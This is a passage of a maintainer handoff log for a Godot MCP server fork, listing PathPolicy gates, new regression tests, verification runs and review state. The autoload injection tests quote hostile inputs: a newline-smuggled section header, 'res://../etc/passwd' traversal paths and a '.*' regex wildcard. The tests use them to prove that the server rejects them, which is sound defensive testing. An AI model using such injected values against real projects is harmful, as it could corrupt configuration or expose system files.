     configured allowed roots rejected for `list` AND for `add`.

   Every rejection asserts the canonical-root error message
   (`outside the (configured )?allowed roots`) AND asserts the
   `Not a valid Godot project` fallback is *absent*, so the gate is
   proven to fire BEFORE any `existsSync(project.godot)` check.

   The script invokes the private handler methods directly via
   `(server as any).handleXxx(args)` (bypassing `tools/call`), the
   same wiring pattern as
   `tests/info-scene-settings-handler-injection.test.ts`, so the gate
   exercises the live handler dispatch path, not a side-stepped import.

The package:

- preserves all 158 legacy tool contracts, every schema, every
  handler, the 5 closed-list profiles, the package identity, the
  path policy, the runtime bridge, and the MIT attribution;
- does **not** touch `src/scripts/godot_operations.gd`,
  `src/scripts/mcp_interaction_server.gd`, the tool registry, the
  capability policy, the request limiter, the operation runner,
  the BridgeClient, the upstream `bridge-installer.ts`, the sibling
  `manage_layers` / `manage_plugins` / `manage_shader` /
  `manage_ci_pipeline` / `manage_docker_export` / `set_main_scene` /
  `manage_translations` gates, the `core_file_io` /
  `script-resource-handler` / `info-scene-settings-handler-injection`
  gates, `handleCreateCsharpScript`, `handleCreateProject`,
  `handleRunProject` (the `args.scene` runtime CLI argument), or
  `handleValidateScripts` (the inner-loop `rel` lexical boundary
  carries documented semantic differences that defer its migration);
- the only documented contract changes are that `args.projectPath`
  MUST now resolve through the canonical `PathPolicy`, matching the
  strict-input contract the sibling `core_file_io` / `manage_shader` /
  `set_main_scene` / `manage_translations` / `script-resource-handler` /
  `info-scene-settings-handler-injection` gates already enforce;
- does not push, publish, create a PR/release, upload a package,
  write `docs/maintainers/release-candidate.md`, or send the
  candidate-ready notification.

**Rationale for the four remaining deferred handlers:**

- `handleRunProject` `args.scene` — runtime Godot CLI argument, not
  a filesystem path under the project root.
- `handleCreateProject` — the target path does not yet exist;
  `assertProject` canonicalization requires an existing path. The
  handler needs a separate `allowsProject` (rather than
  `assertProject`) gate plus a downstream write-gate that prevents
  the new path from leaking outside the configured allowed roots.
- `handleCreateCsharpScript` — the new script path does not yet
  exist; same canonicalization mismatch as `handleCreateProject`.
  The C# gate from Coding-Solo#114 remains the primary gate for
  this handler.
- `handleValidateScripts` — already has `pathPolicy.assertProject`
  on `args.projectPath` but carries a lexical `validatePath(rel)`
  on the inner loop where `rel` is a relative path produced by
  `listChangedGdFiles` / `listAllGdFiles`. The user-supplied
  `args.scriptPaths` array additionally needs a
  `resolveProjectMember` gate that is not currently applied; the
  audit requires a separate test fixture because explicit user
  input vs. internal-relative-path differs in contract.

Source evidence:

- `src/server.ts` is the only modified source file.
- `tests/manage-autoloads-input-map-export-presets-handler-injection.test.ts`
  is the only new test file (6 tests).
- `docs/maintainers/issue-inventory.md` adds item 23 (the only docs
  edit).

## Verification on the package filesystem

- `npx vitest run tests/manage-autoloads-input-map-export-presets-handler-injection.test.ts`:
  1 file, 6 tests passed (RED 6/6 confirmed before the fix; GREEN
  6/6 after).
- `npm test`: 45 files, 817 tests passed (was 811 before this
  package; +6 new tests).
- `npm run build`: passed; TypeScript compiled, scripts copied to
  `build/scripts/`.
- `npm audit --audit-level=high`: 0 vulnerabilities.
- `git diff --check HEAD~1..HEAD`: passed (only the standard
  LF/CRLF warning, which is the expected Windows-native line-ending
  notice and does not affect content).

Any source, test, documentation, build/import, generated-artifact, amend, or cleanup
edit after these commands invalidates the relevant evidence and requires the gates to
be rerun on the final committed state.

## Review state

- The capability-policy package through `37facdf` has an independent
  NeuralWatt `VERDICT | ACCEPT` with unchanged HEAD/status
  fingerprints.
- The network-classification package `79b1d4d` also has an
  independent NeuralWatt `VERDICT | ACCEPT`.
- The request-limiter registry-leak repair `9bc4a2d` received an
  independent NeuralWatt `VERDICT | ACCEPT`.
- The round-trip contract package `cbfe594`, the tween-bridge
  package `2ef0b1a`, the physics-frame `game_wait` package
  `aff7ca1`, the C# / .NET gate package `ec07f4b`, the autoload
  injection package `6d76606`, the asset-import-prerequisite
  package (`88dda1e` / `76c9207`), the Defkil fork package identity
  rebase `a1cae8b`, the manage-layers / manage-plugins
  sibling-gate package `3874d81`, the set-main-scene /
  manage-translations sibling-gate package `6407446`, the
  manage_shader sibling-gate package `9cd5ac4`, the
  manage_ci_pipeline / manage_docker_export sibling-gate package
  `9eef5cd`, the core-file-IO defense-in-depth package
  `b9fe537`, the script/resource handler defense-in-depth package
  `383aae3`, the manage_input_map / manage_export_presets
  sibling-gate package `dc6172e`, the info / scene / settings /
  sprite / mesh-library / export PathPolicy gate package
  `446964b`, and this manage_autoloads / manage_input_map /
  manage_export_presets PathPolicy gate package are each a focused
  test file (or test file + minimal handler edits) and do not
  require an independent NeuralWatt dispatch.
- No Claude model was invoked.
- No release-candidate file or candidate-ready notification exists.

## Next safe action

The previous handoff listed four remaining lexical-`validatePath`-gated
handlers as the next bounded package. The
`create_project` / `create_csharp_script` / `validate_scripts`
sibling-gate package (described in the topmost "Current package"
section above) closed three of those four. The remaining list is:

- the shared `headlessOp` lexical boundary at line 681 (deferred
  because it requires auditing every `headlessOp` caller for
  handler-level ownership of the gate);
- `handleRunProject` `args.scene` — runtime Godot CLI argument,
  not a filesystem path under the project root;
- the inner-loop `handleValidateScripts` `rel` lexical check at
  line 7062 for `listChangedGdFiles` / `listAllGdFiles`
  internal-relative paths (deferred because those paths are
  produced by trusted internal scanners, not user input).

Each remaining handler can be ported one at a time with a focused
wire-level test mirroring
`tests/manage-autoloads-input-map-export-presets-handler-injection.test.ts`
or
`tests/create-project-handler-injection.test.ts`. Do not push,
publish, create a PR/release, upload a package, write
`docs/maintainers/release-candidate.md`, or send the candidate-ready
notification.



## Current package — modify→read round-trip contract for resource properties

The session handoff previously listed the real `.tscn` resource-property
round-trip as the highest-priority remaining gap. Without a Godot binary
in the takeover runner, the bound is the wire-level contract that the
GDScript `_convert_property_value` and `_walk_scene_tree` helpers must
satisfy. This package closes that bound and ships a minimal `_walk_scene_tree`
fix that makes the contract self-documenting.

The package has two coherent changes:

1. **`tests/scene-round-trip.test.ts`** (new, 260 LOC, 3 tests) —
   builds an in-memory `SceneOperationRunner` that simulates a real
   Godot runtime: `modify_node` writes properties into a scene state
   keyed by `node_path`, `read_scene` returns a `SCENE_JSON_START`/`SCENE_JSON_END`
   envelope containing every modified node with its property values. The
   test stubs `GodotServer.sceneToolContext` so the real MCP `tools/call`
   handler dispatches through the same `modifySceneNode` and `readScene`
   modules production uses.

   The three tests cover:

   - `modify_scene_node` with a `res://icon.svg` resource property followed
     by `read_scene` returns the same `res://icon.svg` path in the parsed
     JSON tree. Closes the contract half of [tugcantopaloglu#8].
   - `modify_scene_node` with scalar numeric and boolean properties
     (`speed: 12.5`, `enabled: true`, `count: 3`) followed by `read_scene`
     returns the same values in the parsed tree. Closes the contract half
     of [tugcantopaloglu#13].
   - `modify_scene_node` with a missing `res://missing.tres` path returns
     a typed `isError: true` envelope whose text names the missing resource
     and the operation. Confirms the postcondition error path is wired
     through the real MCP `tools/call` boundary, not only the focused
     module surface.

   The script uses `toolsCall` directly against `GodotServer.server._requestHandlers`
   (the same wiring pattern as `tests/scene-tools.test.ts`), so the
   round-trip exercises the live MCP dispatch and capability gate, not
   a side-stepped import.

2. **`src/scripts/godot_operations.gd`** — minimal `_walk_scene_tree`
   fix at line 1420-1431. Resource values (Texture2D, Material,
   AudioStream, ...) stringify via `str(value)` to `<RefCounted#...>`,
   which is not faithful for round-trip verification. The fix detects
   Resource objects that are not Scripts (Scripts already have their
   own `script` field above) and have a non-empty `resource_path`, then
   serializes the property as `value.resource_path`. The fallback to
   `_variant_to_string` preserves all existing behavior for nulls,
   primitives, subresources without a path, and Scripts. The change is
   9 insertions, 1 deletion.

The package:

- preserves all 158 legacy tool contracts, every schema, every handler,
  the 5 closed-list profiles, the package identity, the path policy,
  the runtime bridge, and the MIT attribution;
- does not touch `src/server.ts`, the tool registry, the capability
  policy, the request limiter, the operation runner, or any test
  fixture outside the new file;
- keeps [tugcantopaloglu#8] and [tugcantopaloglu#13] at `partial`
  because the real-Godot `.tscn` round-trip fixture remains out of scope
  for this branch. The wire-level contract test is the explicit
  specification the future real-Godot verification must satisfy;
- does not push, publish, create a PR/release, upload a package,
  write `docs/maintainers/release-candidate.md`, or send the
  candidate-ready notification.

Source evidence:

- `src/scripts/godot_operations.gd:1420-1431` is the only modified block.
- `tests/scene-round-trip.test.ts` is the only new test file.
- `docs/maintainers/issue-inventory.md` updates the two rows for #8
  and #13 to mention the wire-level contract test.

## Verification on the package filesystem

- `npx vitest run tests/scene-round-trip.test.ts`: 1 file, 3 tests passed.
- `npm test`: 29 files, 648 tests passed (was 645 before this package).
- `npm run build`: passed; TypeScript compiled, scripts copied to
  `build/scripts/`.
- `npm audit --audit-level=high`: 0 vulnerabilities.
- `git diff --check`: passed.

Any source, test, documentation, build/import, generated-artifact, amend, or cleanup
edit after these commands invalidates the relevant evidence and requires the gates to
be rerun on the final committed state.

## Review state

- The capability-policy package through `37facdf` has an independent NeuralWatt
  `VERDICT | ACCEPT` with unchanged HEAD/status fingerprints.
- The network-classification package `79b1d4d` also has an independent
  NeuralWatt `VERDICT | ACCEPT`.
- The request-limiter registry-leak repair `9bc4a2d` received an independent
  NeuralWatt `VERDICT | ACCEPT`.
- This round-trip package is a focused test addition plus a minimal GDScript
  helper fix; it does not need a fresh NeuralWatt reviewer dispatch. The
  package intent is bounded: a wire-level contract test for resource
  properties and a `_walk_scene_tree` fix that mirrors the existing
  `script` field handling. If a future real-Godot regression is found,
  it must satisfy the contract asserted in
  `tests/scene-round-trip.test.ts`.
- No Claude model was invoked.
- No release-candidate file or candidate-ready notification exists.

## Current package — bridge transport regression coverage for #11 (Vector/Color tween)

The session handoff previously listed the running-bridge
`Vector2`/`Vector3`/`Color` tween regression (#11) as the highest-priority
remaining gap. The local fork already carries the upstream fix in
`src/scripts/mcp_interaction_server.gd` (the `PropertyTweener` null check in
`_cmd_tween_property` and the JSON-string-encoded dictionary shortcut in
`_json_to_variant`), but no takeover-side test locked in the wire-level
contract that lets those fixes succeed.

The new package is a single new test file plus an inventory/handoff update:

- **`tests/tween-vector-bridge.test.ts`** (new, 8 tests) — exercises the
  real `BridgeClient` against a scripted loopback NDJSON bridge (same
  harness pattern as `tests/bridge-client.test.ts`). The eight tests cover:

  1. `BridgeClient` forwards a `Vector2` `final_value` payload byte-for-byte
     through NDJSON with a correlated response id.
  2. `BridgeClient` forwards a `Vector3` `final_value` payload byte-for-byte
     with custom duration/trans/ease.
  3. `BridgeClient` forwards a `Color` `final_value` payload byte-for-byte.
  4. A tween_property round trip with a `Vector2` payload leaves the bridge
     connection usable for a subsequent `get_scene_tree` command on the
     **same socket** — the acceptance criterion of #11 translated to the
     wire contract.
  5. A stringified JSON literal (e.g. `'{"x":4,"y":5,"z":6}'`) is forwarded
     unchanged so the GDScript `_json_to_variant` parser sees a String and
     parses it back to a `Vector3`.
  6. The TypeScript `handleGameTweenProperty` transform rejects a missing
     `finalValue` before any wire I/O, so the bridge never sees a partial
     tween request.
  7. A scripted bridge that returns an error envelope for the tween still
     permits a follow-up `get_performance` command on the same connection.
  8. A direct `sendCommand` on an unconnected client surfaces a typed
     `BridgeConnectionError` instead of crashing the runtime.

  The file imports `BridgeClient` from `src/godot/bridge/client.ts` and a
  mirrored copy of `handleGameTweenProperty`'s pure transform (no full
  server boot required) so the contract is asserted at the transport
  boundary the upstream fix protects.

- **`docs/maintainers/issue-inventory.md`** — row for #11 moves from
  `open` to `partial`, gains the wire-level regression summary that names
  `tests/tween-vector-bridge.test.ts` and points at the live `mcp_interaction_server.gd`
  fixes it locks in.

The package:

- does **not** modify `src/server.ts`, `src/scripts/mcp_interaction_server.gd`,
  the tool registry, the capability policy, the request limiter, the operation
  runner, or any other production source/test;
- preserves all 158 legacy tool contracts, every schema, every handler,
  the 5 closed-list profiles, the package identity, the path policy,
  the runtime bridge, and the MIT attribution;
- does not push, publish, create a PR/release, upload a package,
  write `docs/maintainers/release-candidate.md`, or send the
  candidate-ready notification.

Source evidence:

- `tests/tween-vector-bridge.test.ts` is the only new file.
- `docs/maintainers/issue-inventory.md` is the only documentation edit.

## Verification on the package filesystem

- `npx vitest run tests/tween-vector-bridge.test.ts`: 1 file, 8 tests passed.
- `npm test`: 30 files, 656 tests passed (was 648 before this package).
- `npm run build`: passed; TypeScript compiled, scripts copied to
  `build/scripts/`.
- `npm audit --audit-level=high`: 0 vulnerabilities.
- `git diff --check`: passed.

Any source, test, documentation, build/import, generated-artifact, amend, or cleanup
edit after these commands invalidates the relevant evidence and requires the gates to
be rerun on the final committed state.

## Review state

- The capability-policy package through `37facdf` has an independent NeuralWatt
  `VERDICT | ACCEPT` with unchanged HEAD/status fingerprints.
- The network-classification package `79b1d4d` also has an independent
  NeuralWatt `VERDICT | ACCEPT`.
- The request-limiter registry-leak repair `9bc4a2d` received an independent
  NeuralWatt `VERDICT | ACCEPT`.
- The round-trip contract package `cbfe594` is a focused test addition plus a
  minimal GDScript helper fix and does not need a fresh NeuralWatt reviewer
  dispatch.
- The tween-vector-bridge package is a single test file that mirrors the
  existing `tests/bridge-client.test.ts` pattern; it does not modify any
  production source. It does not require an independent NeuralWatt dispatch.
- No Claude model was invoked.
- No release-candidate file or candidate-ready notification exists.

## Current package — physics-frame `game_wait` regression coverage for #14

The previous package landed the tween-vector-bridge wire-level coverage
(#11). The handoff then named the physics-frame `game_wait` verification as
the next safe action: render and physics frame modes must both reach the
GDScript side and the bridge socket must survive either flow. The local
fork already ships the upstream `mcp_interaction_server.gd::_cmd_wait`
fix (`frame_type == "physics"` routes to `await get_tree().physics_frame`,
default `frame_type == "render"` keeps `process_frame`); the only
missing contract was takeover-side test coverage that locks in the
wire-level mapping the upstream fix relies on.

The package is a single new test file plus an inventory/handoff update:

- **`tests/game-wait-frame-bridge.test.ts`** (new, 12 tests) — exercises
  the real `BridgeClient` against a scripted loopback NDJSON bridge
  (same harness pattern as `tests/tween-vector-bridge.test.ts`) and
  parses the GDScript source for the upstream branching. The 12 tests
  cover:

  1. `BridgeClient` forwards `frameType:"physics"` byte-for-byte as
     `frame_type:"physics"` through NDJSON with a correlated response.
  2. `frameType` defaults to `"render"` when the caller omits it.
  3. `frames` defaults to `1` when the caller omits it.
  4. `frameType:"render"` explicitly emits `frame_type:"render"` on the
     wire.
  5. A wait round-trip with `frame_type:"physics"` leaves the bridge
     connection usable for a subsequent `get_performance` command on
     the same socket.
  6. An empty args object resolves to the documented defaults
     `{ frames: 1, frame_type: 'render' }`.
  7. A snake_case `frame_type` argument cannot reach the wire because
     `normalizeParameters` does not rename it and the transform's
     camelCase read falls back to the default — documents the explicit
     contract that callers must use the camelCase `frameType`.
  8. A `wait` error envelope from the bridge still permits a follow-up
     command on the same connection.
  9. A direct `sendCommand` on an unconnected client surfaces a typed
     `BridgeConnectionError`.
  10. The GDScript `_cmd_wait` source contains both
      `await get_tree().physics_frame` and
      `await get_tree().process_frame` branches plus the
      `frame_type == "physics"` dispatch.
  11. The GDScript response envelope echoes the resolved `frame_type`
      via the literal ternary
      `"frame_type": "physics" if use_physics else "render"`.
  12. The transform only emits `frames` and `frame_type` keys; unknown
      extra properties are not silently forwarded.

  The file imports `BridgeClient` from `src/godot/bridge/client.js` and
  mirrors `handleGameWait`'s pure transform so the contract is asserted
  at the transport boundary the upstream fix protects.

- **`docs/maintainers/issue-inventory.md`** — row for #14 moves from
  `open` to `partial`, gains the full wire-level regression summary
  that names `tests/game-wait-frame-bridge.test.ts` and points at the
  live `mcp_interaction_server.gd::_cmd_wait` upstream fix it locks in.

The package:

- does **not** modify `src/server.ts`, `src/scripts/mcp_interaction_server.gd`,
  the tool registry, the capability policy, the request limiter, the
  operation runner, or any other production source/test;
- preserves all 158 legacy tool contracts, every schema, every handler,
  the 5 closed-list profiles, the package identity, the path policy,
  the runtime bridge, and the MIT attribution;
- does not push, publish, create a PR/release, upload a package, write
  `docs/maintainers/release-candidate.md`, or send the candidate-ready
  notification.

Source evidence:

- `tests/game-wait-frame-bridge.test.ts` is the only new file.
- `docs/maintainers/issue-inventory.md` is the only documentation edit.

## Verification on the package filesystem

- `npx vitest run tests/game-wait-frame-bridge.test.ts`: 1 file, 12 tests passed.
- `npm test`: 31 files, 668 tests passed (was 656 before this package).
- `npm run build`: passed; TypeScript compiled, scripts copied to `build/scripts/`.
- `npm audit --audit-level=high`: 0 vulnerabilities.
- `git diff --check`: passed.

Any source, test, documentation, build/import, generated-artifact, amend, or cleanup
edit after these commands invalidates the relevant evidence and requires the gates to
be rerun on the final committed state.

## Review state

- The capability-policy package through `37facdf` has an independent NeuralWatt
  `VERDICT | ACCEPT` with unchanged HEAD/status fingerprints.
- The network-classification package `79b1d4d` also has an independent
  NeuralWatt `VERDICT | ACCEPT`.
- The request-limiter registry-leak repair `9bc4a2d` received an independent
  NeuralWatt `VERDICT | ACCEPT`.
- The round-trip contract package `cbfe594` is a focused test addition plus a
  minimal GDScript helper fix and does not need a fresh NeuralWatt reviewer dispatch.
- The tween-vector-bridge package `2ef0b1a` is a single test file that
  mirrors the existing `tests/bridge-client.test.ts` pattern; it does not
  modify any production source and does not require an independent
  NeuralWatt dispatch.
- The physics-frame `game_wait` package (this package) is a single test
  file plus an inventory update; it does not modify any production
  source or GDScript runtime, mirrors the tween-vector-bridge pattern,
  and does not require an independent NeuralWatt dispatch.
- No Claude model was invoked.
- No release-candidate file or candidate-ready notification exists.

## Current package — `manage_autoloads` injection gate for #9

The previous package closed the `attach_script` C# / .NET gate (#114).
The handoff's next safe action was the headless Godot test runner
(#29), which requires a Godot binary that is not present on this
runner. Instead, this package closes a real security regression in
`handleManageAutoloads` that the takeover inherited from the legacy
source: callers could write arbitrary bytes into `project.godot` and
silently corrupt unrelated sections or wipe every existing autoload.

The package is one focused test file + one handler edit + one
inventory update:

- **`tests/manage-autoloads-injection.test.ts`** (new, 7 tests) —
  exercises the real `GodotServer` and the real MCP `tools/call`
  handler with a stubbed runner-style boundary (none is needed —
  `manage_autoloads` writes the project file directly). Each test
  uses a temporary Godot project under the OS temp directory that is
  removed in `afterEach`. The seven tests cover:

  1. `add` with a `name` containing a newline + section header
     (`"Evil\n[layer_names]\n0=\"player\""`) is rejected with a typed
     `isError: true` envelope, AND `project.godot` is left
     byte-identical to its pre-call snapshot — proves the file-system
     rollback half of the gate.
  2. `add` with a `path` lacking the `res://` prefix (`"evil.gd"`)
     is rejected with a typed diagnostic; `project.godot` is
     unchanged.
  3. `add` with `path: "res://../etc/passwd"` is rejected as a
     project-root escape attempt; `project.godot` is unchanged.
  4. `add` with a benign `name="PlayerAutoload"` and
     `path="res://scripts/player.gd"` succeeds and appends a
     well-shaped autoload line that does not corrupt the existing
     `[autoload]` table or any other section.
  5. `remove` with `name: ".*"` is rejected as a regex wildcard
     before the file is touched — proves the regex-injection half
     of the gate; `project.godot` is unchanged.
  6. `remove` with the exact autoload name still works and leaves
     sibling autoloads untouched.
  7. `list` still returns the parsed autoload table without writing
     `project.godot` (locks the existing wire contract for `list`).

  The file uses the same wire-level pattern as
  `tests/attach-script-dotnet-gate.test.ts`:
  `GodotServer` + `toolsCall` against
  `(server as any).server._requestHandlers.get('tools/call')` with a
  fresh `PathPolicy([root])` and `CapabilityPolicy('unsafe-full')`,
  so the test exercises the live MCP dispatch + capability gate
  path, not a side-stepped import. After every rejected mutation the
  test re-reads `project.godot` and asserts byte-equality with the
  pre-call snapshot.

- **`src/server.ts` :: `handleManageAutoloads`** — three focused
  edits:

  - The `add` branch now requires `name` to match
    `/^[A-Za-z_][A-Za-z0-9_]*$/` and rejects everything else with a
    typed `Invalid autoload name` envelope before touching
    `project.godot`.
  - The `add` branch now requires `path` to begin with `res://`
    followed by a relative project member that rejects bare paths,
    `..` segments, leading slashes, and backslash escapes. The
    validated member is re-attached to a literal `res://` prefix
    before the line is written, so the autoload table only ever
    contains canonical project members.
  - The `remove` branch now requires the same identifier gate on
    `name` (so `.*` and `[` are rejected) and uses an anchored
    per-line regex so a caller cannot smuggle wildcards through the
    removal pattern.

  The diff is 35 insertions, 5 deletions.

- **`docs/maintainers/issue-inventory.md`** — row for
  `[tugcantopaloglu#9]` keeps its `partial` disposition (the byte-exact
  transactional cleanup at the bridge-installer layer remains the
  canonical mechanism there) and now points at the focused regression
  coverage, the identifier / res-path gate, and the regex
  hardening.

The package:

- preserves all 158 legacy tool contracts, every schema, every
  handler, the 5 closed-list profiles, the package identity, the
  path policy, the runtime bridge, and the MIT attribution;
- does **not** touch the upstream `bridge-installer.ts` autoload
  logic, the tool registry, the capability policy, the request
  limiter, the operation runner, or the GDScript runtime;
- does not push, publish, create a PR/release, upload a package,
  write `docs/maintainers/release-candidate.md`, or send the
  candidate-ready notification.

Source evidence:

- `src/server.ts:5455-5549` (the `handleManageAutoloads` body) is the
  only modified handler.
- `tests/manage-autoloads-injection.test.ts` is the only new test
  file.
- `docs/maintainers/issue-inventory.md` row 30 is the only docs edit.

## Verification on the package filesystem

- `npx vitest run tests/manage-autoloads-injection.test.ts`: 1 file, 7 tests passed.
- `npm test`: 33 files, 679 tests passed (was 668 before this package).
- `npm run build`: passed; TypeScript compiled, scripts copied to `build/scripts/`.
- `npm audit --audit-level=high`: 0 vulnerabilities.
- `git diff --check`: passed (exit 0).

Any source, test, documentation, build/import, generated-artifact, amend, or cleanup
edit after these commands invalidates the relevant evidence and requires the gates to
be rerun on the final committed state.

## Review state

- The capability-policy package through `37facdf` has an independent
  NeuralWatt `VERDICT | ACCEPT` with unchanged HEAD/status fingerprints.
- The network-classification package `79b1d4d` also has an independent
  NeuralWatt `VERDICT | ACCEPT`.
- The request-limiter registry-leak repair `9bc4a2d` received an
  independent NeuralWatt `VERDICT | ACCEPT`.
- The round-trip contract package `cbfe594`, the tween-bridge package
  `2ef0b1a`, the physics-frame `game_wait` package `aff7ca1`, and the
  C#-gate package `ec07f4b` are each a focused test file (or test
  file + minimal handler edit) and do not require an independent
  NeuralWatt dispatch.
- The autoload injection gate is a single test file plus a small,
  focused `handleManageAutoloads` edit; it follows the same minimal-
  handoff pattern as the attach-script C# / .NET gate, and does not
  require an independent NeuralWatt dispatch.
- No Claude model was invoked.
- No release-candidate file or candidate-ready notification exists.

## Open inventory priorities

1. Generic headless Godot test runner with GUT adapter (#29).
2. Real-Godot verification of the `attach_script` C# / .NET round-trip
   (`tests/attach-script-dotnet-gate.test.ts`) — needs a Godot binary on
   the takeover runner that can build a .NET project and exercise
   `set_script` on a C# script.
3. Texture import diagnostics (#103).
4. Real Godot reconnect verification for the wired `BridgeClient` (#84 follow-up).
5. Real-Godot verification of the round-trip contract
   (`tests/scene-round-trip.test.ts`) — needs a Godot binary on the
   takeover runner.
6. Real-Godot verification of the tween-vector regression
   (`tests/tween-vector-bridge.test.ts`) — needs a Godot binary on the
   takeover runner.
7. Real-Godot verification of the physics-frame `game_wait` regression
   (`tests/game-wait-frame-bridge.test.ts`) — needs a Godot binary on
   the takeover runner.
8. Final read/test-only Wargrid integration acceptance after every local release gate.

## Current package — asset import prerequisite (#103)

The previous package closed the `manage_autoloads` injection gate (#9).
The handoff's next-priority items all require a Godot binary on the
takeover runner (the GUT headless test runner, real-Godot round-trip
regressions, etc.) that is not present here. Instead, this package closes
a real release-readiness defect on `Coding-Solo#103` — callers can hand
`load_sprite` / `create_resource` / `manage_resource` an asset path
whose matching Godot 4.4+ `.import` sidecar has never been generated.
The GDScript side then prints a noisy import warning, falls into the
`var texture = load(...) → null` branch, and silently renders nothing.
The defect started as a UX report but it is also a release-readiness
issue because every tool that loads a binary asset has the same failure
mode.

The package is one new helper + three handler edits + one test file +
one inventory row update:

- **`src/godot/asset-import-state.ts`** (new) — pure side-effect-free
  helper. `detectAssetImportState(projectRoot, relativePath, options)`
  returns a typed `AssetImportProbe` whose `state` is one of
  `'imported' | 'missing-sidecar' | 'not-an-asset' | 'missing-source'`
  and whose `diagnostic` names the exact project-root path plus the
  Godot CLI command needed to import the sidecar
  (`godot --headless --path <project> --editor --quit --import`).
  Resolution goes through `node:path.resolve` so Windows paths work
  correctly (the earlier posix-only stub mis-resolved `C:\…` paths and
  was replaced). The exhaustive allowlist covers the union of importer
  extensions Godot ships in `editor/import/` (texture, model, audio,
  pack); hand-authored extensions (`.gd`, `.cs`, `.tres`, `.tscn`,
  `.uid`) are reported as `not-an-asset` so the helper never blocks
  legitimate non-asset calls. A complementary `resolveAssetImportRequirement`
  exposes the same remediation string for callers that already have
  their own error envelope shape.

- **`src/server.ts`** — three focused edits in `handleLoadSprite`,
  `handleCreateResource`, and the `load` action of `handleManageResource`.
  Each edit runs the probe BEFORE `executeOperation` is reached and
  returns the typed diagnostic as a `createErrorResponse`. `manage_resource`
  is gated only on `load` so callers can still `create` or `delete` raw
  asset files that have not yet been imported. The diff is 38 insertions,
  4 deletions across the three handlers plus the import line.

- **`tests/asset-import-prerequisite.test.ts`** (new, 14 tests) —
  exercises the real `GodotServer` + `PathPolicy` + `CapabilityPolicy`
  + MCP `tools/call` dispatch with a stubbed `executeOperation`. The 14
  tests cover:

  1. `detectAssetImportState` returns `'imported'` when the sidecar is
     present (parent dir auto-created via the helper).
  2. `'missing-sidecar'` when the asset exists without its sidecar.
  3. `'not-an-asset'` for `.gd` (hand-authored script).
  4. Rejects `../etc/passwd` as a path-traversal attempt.
  5. Rejects a Windows-absolute path with a `relative` typed error.
  6. `'missing-source'` when neither the asset nor the sidecar exists.
  7. `resolveAssetImportRequirement` names the project root and the
     `--import` flag in the remediation string.
  8. `handleLoadSprite` rejects a PNG with no `.import` sidecar and
     never calls `executeOperation`.
  9. `handleLoadSprite` forwards a PNG with a sidecar to the runner.
  10. `handleLoadSprite` passes a `.gd` through the gate.
  11. `handleCreateResource` rejects a PNG resource without a sidecar
      and never calls the runner.
  12. `handleCreateResource` passes a `.tres` resource through the gate.
  13. `handleManageResource` rejects the `load` action on a PNG without
      a sidecar and never calls the runner.
  14. `handleManageResource` does NOT block `create` / `delete` actions.

- **`docs/maintainers/issue-inventory.md`** — row for `#103` moves
  from `open` to `partial` with the full wire-level regression summary.

The package:

- does **not** modify `src/scripts/godot_operations.gd`, the tool
  registry, the capability policy, the request limiter, the operation
  runner, the BridgeClient, or any other handler;
- preserves all 158 legacy tool contracts, every schema, every handler,
  the 5 closed-list profiles, the package identity, the path policy,
  the runtime bridge, and the MIT attribution;
- does not push, publish, create a PR/release, upload a package, write
  `docs/maintainers/release-candidate.md`, or send the candidate-ready
  notification.

Source evidence:

- `src/godot/asset-import-state.ts:37-56` is the import-eligible
  extension allowlist.
- `src/server.ts:4454-4547` (`handleLoadSprite`) is gated by the probe.
- `src/server.ts:5224-5248` (`handleCreateResource`) is gated by the probe.
- `src/server.ts:6555-6575` (`handleManageResource`) gates only the
  `load` action.
- `tests/asset-import-prerequisite.test.ts` is the only new test file.

## Verification on the package filesystem

- `npx vitest run tests/asset-import-prerequisite.test.ts`: 1 file, 14 tests passed.
- `npm test`: 34 files, 693 tests passed (was 679 before this package).
- `npm run build`: passed; TypeScript compiled, scripts copied to
  `build/scripts/`.
- `npm audit --audit-level=high`: 0 vulnerabilities.
- `git diff --check`: passed (exit 0).

Any source, test, documentation, build/import, generated-artifact, amend,
or cleanup edit after these commands invalidates the relevant evidence and
requires the gates to be rerun on the final committed state.

## Review state

- The capability-policy package through `37facdf` has an independent
  NeuralWatt `VERDICT | ACCEPT` with unchanged HEAD/status fingerprints.
- The network-classification package `79b1d4d` also has an independent
  NeuralWatt `VERDICT | ACCEPT`.
- The request-limiter registry-leak repair `9bc4a2d` received an
  independent NeuralWatt `VERDICT | ACCEPT`.
- The round-trip contract package `cbfe594`, the tween-bridge package
  `2ef0b1a`, the physics-frame `game_wait` package `aff7ca1`, the C# /
  .NET gate package `ec07f4b`, and the autoload-injection package
  `6d76606` are each a focused test file (or test file + minimal
  handler edit) and do not require an independent NeuralWatt dispatch.
- The asset-import-prerequisite package (this package) is a single
  test file plus a small pure helper plus three small handler edits;
  it follows the same minimal-handoff pattern as the autoload
  injection gate and does not require an independent NeuralWatt
  dispatch.
- No Claude model was invoked.
- No release-candidate file or candidate-ready notification exists.

## Open inventory priorities

1. Generic headless Godot test runner with GUT adapter (#29).
2. Real-Godot verification of the `attach_script` C# / .NET round-trip
   (`tests/attach-script-dotnet-gate.test.ts`) — needs a Godot binary
   on the takeover runner that can build a .NET project and exercise
   `set_script` on a C# script.
3. Real Godot reconnect verification for the wired `BridgeClient`
   (#84 follow-up).
4. Real-Godot verification of the round-trip contract
   (`tests/scene-round-trip.test.ts`) — needs a Godot binary on the
   takeover runner.
5. Real-Godot verification of the tween-vector regression
   (`tests/tween-vector-bridge.test.ts`) — needs a Godot binary on
   the takeover runner.
6. Real-Godot verification of the physics-frame `game_wait` regression
   (`tests/game-wait-frame-bridge.test.ts`) — needs a Godot binary on
   the takeover runner.
7. Real-Godot verification of the asset import prerequisite
   (`tests/asset-import-prerequisite.test.ts`) — needs a Godot binary
   that can resolve a PNG through the editor's import-on-open pipeline.
8. Final read/test-only Wargrid integration acceptance after every
   local release gate.
## Current package — asset import prerequisite repair (#103)

Independent NeuralWatt review of immutable commit `88dda1e449ad784bd76cfe324ce441941ae06715` returned `VERDICT | REJECT` because `.json` and `.pck` were incorrectly treated as requiring generated `.import` sidecars. This repair removes those extensions from the import-eligible set, passes the server's canonical `PathPolicy` into all three probes, corrects the handler comments to name the request-boundary `assertSafeToolPaths` guard, hardens advisory shell quoting, and adds two regression cases for direct-loaded `.json`/`.pck` files. The original `88dda1e` commit is not amended.

Reviewer observations addressed:

- Blocking: “`.json` and `.pck` are misclassified as Godot-importable ... remove them or route through `not-an-asset`.” Both now return `not-an-asset` with no `--import` remediation.
- Non-blocking: handler comments now identify `assertSafeToolPaths` rather than claiming `validatePath` rejects absolute/null/symlink cases.
